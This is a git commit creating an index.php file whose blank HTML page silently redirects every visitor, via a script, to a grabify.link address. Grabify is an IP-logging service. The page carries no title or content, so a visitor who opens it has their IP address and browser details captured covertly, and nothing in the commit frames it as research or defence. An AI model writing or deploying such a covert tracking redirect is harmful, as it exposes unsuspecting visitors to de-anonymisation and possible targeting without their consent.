ffaed5f7fa23f960201a2945d52101d3e230dcec
bouncewne <94755030+bouncewne@users.noreply.github.com>
2021-11-20 16:26:31 +0000

    Create index.php

---
+++ index.php
@@ -0,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title></title>
+</head>
+<body>
+
+	<script type="text/javascript">
+		window.location.replace("https://grabify.link/UQWYS8");
+	</script>
+
+</body>
+</html>
